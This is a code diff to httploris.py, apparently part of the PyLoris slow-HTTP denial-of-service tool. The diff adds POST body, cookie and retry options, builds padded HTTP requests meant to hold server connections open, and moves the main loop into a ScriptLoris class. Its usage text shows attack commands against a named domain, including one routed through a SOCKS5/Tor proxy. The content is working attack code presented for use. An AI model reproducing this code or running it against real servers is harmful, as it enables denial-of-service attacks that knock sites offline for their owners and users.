@@ -20,11 +20,16 @@ httploris.py motomastyle.com -c 0 -k -P "/index.html" -s 500000 -w 0.5 -b 0.5 -r
 
 [EXAMPLE] A test through SOCKS5 (i.e. Vidalia):
 httploris.py motomastyle.com --socksversion 5 --sockshost 127.0.0.1 --socksport 9050
+
+CONTRIBUTORS
+Version 1.02 Vlad
+Class ScriptLoris() implemented. Minor changes and Bug fixes.
+Version 1.03 ----
+-------
 """
 
 import optparse
 import sys
-import time
 
 from libloris import *
 
@@ -43,9 +48,9 @@ def parse_options():
     parser.add_option("-q", "--quit", action = "store_true", dest = "quit", default = False, help = "Quit without receiving data from the server (can shorten the duration of the attack)")
     parser.add_option("-r", "--requesttype", action = "store", type = "string", dest = "requesttype", default = 'GET', help = "Request type, GET, HEAD, POST, PUT, DELETE, OPTIONS, or TRACE (default = GET)")
     parser.add_option("-R", "--referer", action = "store", type = "string", dest = "referer", default = '', help = "Set the Referer HTTP header.")
-    parser.add_option("-s", "--size", action = "store", type = "int", dest = "size", default = 0, help = "Size of data segment to attach in cookie (default = 0)")
+    parser.add_option("-s", "--size", action = "store", type = "int", dest = "size", default = 1, help = "Size of data segment to attach in cookie (default = 0)")
     parser.add_option("-S", "--ssl", action = "store_true", dest = "ssl", default = False, help = "Use SSL/TLS connection (for HTTPS testing)")
-    parser.add_option("-u", "--useragent", action = "store", type = "string", dest = "useragent", default = 'pyloris.sf.net', help = "The User-Agent string for connections (defaut = pyloris.sf.net)")
+    parser.add_option("-u", "--useragent", action = "store", type = "string", dest = "useragent", default = '', help = "The User-Agent string for connections (defaut = pyloris.sf.net)")
     parser.add_option("-z", "--gzip", action = "store_true", dest = "gzip", default = False, help = "Request compressed data stream")
 
     parser.add_option("-w", "--timebetweenthreads", action = "store", type = "float", dest = "timebetweenthreads", default = 0, help = "Time to wait between spawning threads in seconds (default = 0)")
@@ -58,6 +63,10 @@ def parse_options():
     parser.add_option("", "--sockspass", action = "store", type = "string", dest = "sockspass", default = '', help = "SOCKS password")
 
     parser.add_option("-v", "--verbosity", action = "store", type = "int", dest = "verbosity", default = 1, help = "Verbosity level")
+    parser.add_option("", "--post", action = "store", type = "string", dest = "post", default = '', help = "Post data to send")
+    parser.add_option("", "--contenttype", action = "store", type = "string", dest = "contenttype", default = 'text/html', help = "Post data type")
+    parser.add_option("", "--cookie", action = "store", type = "string", dest = "cookie", default = '', help = "Cookie data")
+    parser.add_option("", "--trylimit", action = "store", type = "int", dest = "trylimit", default = 10, help = "Number of tries to connect")
 
     (options, args) = parser.parse_args()
 
@@ -75,10 +84,11 @@ def parse_options():
     OptionSet['ssl'] = options.ssl
     OptionSet['attacklimit'] = options.attacklimit
     OptionSet['connectionlimit'] = options.connectionlimit
-    OptionSet['threadlimt'] = options.threadlimit
+    OptionSet['threadlimit'] = options.threadlimit
+    OptionSet['trylimit'] = options.trylimit
     OptionSet['timebetweenthreads'] = options.timebetweenthreads
     OptionSet['timebetweenconnections'] = options.timebetweenconnections
-    OptionSet['connecitonspeed'] = options.connectionspeed
+    OptionSet['connectionspeed'] = options.connectionspeed
     OptionSet['socksversion'] = options.socksversion
     OptionSet['sockshost'] = options.sockshost
     OptionSet['socksport'] = options.socksport
@@ -92,61 +102,52 @@ def parse_options():
         sys.exit(3)
 
     request = '%s %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s' % (requesttype, options.page, args[0], options.useragent)
+    if options.size > 100:
+        count = options.size / 100
+        for i in range(int(count)):
+            request += ('data%i=%s&' % (i, options.useragent * 100))
+        request += 'data=' + (options.useragent * 100)
+    else:
+        request += 'data=' + (options.useragent * options.size)
 
     if options.keepalive == True:
         request += '\r\nKeep-Alive: 300\r\nConnection: Keep-Alive'
 
     if options.gzip == True:
-        request += '\r\nAccept-Encoding: gzip'
+        request += '\r\nAccept-Encoding: gzip, deflate'
 
     if options.referer != '':
         request += '\r\nReferer: %s' % (options.referer)
 
-    if options.size > 0:
+    if options.cookie != '':
         request += '\r\nCookie: '
         if options.size > 100:
             count = options.size / 100
             for i in range(int(count)):
-                request += ('data%i=%s ' % (i, 'A' * 100))
-            request += 'data=' + ('A' * 100)
+                request += ('data%i=%s&' % (i, options.cookie * 100))
+            request += 'data=' + (options.cookie * 100)
         else:
-            request += 'data=' + ('A' * options.size)
+            request += 'data=' + (options.cookie * options.size)
+
+    if requesttype == 'POST':
+        print 'POST method'
+        request += '\r\nContent-Type: %s' % (options.contenttype)
+        request += '\r\nContent-Length: %i' % (len(options.post) * options.size)
+
+    request += '\r\n'
 
     if options.finish == True:
-        print("Specifying the -f or --finish flags can reduce the effectiveness of the test and increase bandwidth usage.")
-        request += '\r\n\r\n'
+        print 'Specifying the -f or --finish flags can reduce the effectiveness of the test and increase bandwidth usage.'
+        request += '\r\n'
 
+    if requesttype == 'POST':
+        request += options.post * options.size
+        
     OptionSet['request'] = request
 
     return OptionSet
 
 if __name__ == "__main__":
-    options = parse_options()
-    loris = Loris()
-    loris.LoadOptions(options)
-    loris.start()
-    time.sleep(1)
-
-    while loris.running:
-        status = loris.status()
-
-        try:
-            while True:
-                message = loris.messages.get()
-                print(message)
-        except:
-            pass
-
-        try:
-            while True:
-                error = loris.errors.get()
-                print(error)
-        except:
-            pass
-
-        print('Pyloris has started %i attacks, with %i threads and %i connections currently running.' % status)
-    status = loris.status()
-    print('Pyloris has completed %i attacks.' % (status[0]))
-
-
-
+    loris=ScriptLoris()
+    loris.options = parse_options()
+    loris.mainloop()
